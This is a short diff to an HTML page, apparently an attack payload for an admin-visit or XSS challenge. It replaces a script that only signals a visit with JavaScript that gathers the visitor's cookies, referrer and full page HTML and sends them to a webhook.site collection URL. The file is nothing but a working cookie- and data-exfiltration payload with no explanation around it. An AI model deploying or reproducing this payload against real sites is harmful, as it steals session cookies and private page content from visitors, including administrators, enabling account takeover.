@@ -1,12 +1,14 @@
-
+<!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      fetch("https://webhook.site/bf5ae41a-c14a-4bb2-8453-db6565bd2917", {
-        method: "POST",
-        body: "Admin visited the payload!",
-        mode: "no-cors"
-      });
-    </script>
-  </body>
+<body>
+<script>
+// Capture both referrer and cookies
+const data = {
+  referrer: document.referrer,
+  cookies: document.cookie,
+  html: document.documentElement.innerHTML
+};
+fetch('https://webhook.site/YOUR-UNIQUE-ID?' + new URLSearchParams(data));
+</script>
+</body>
 </html>
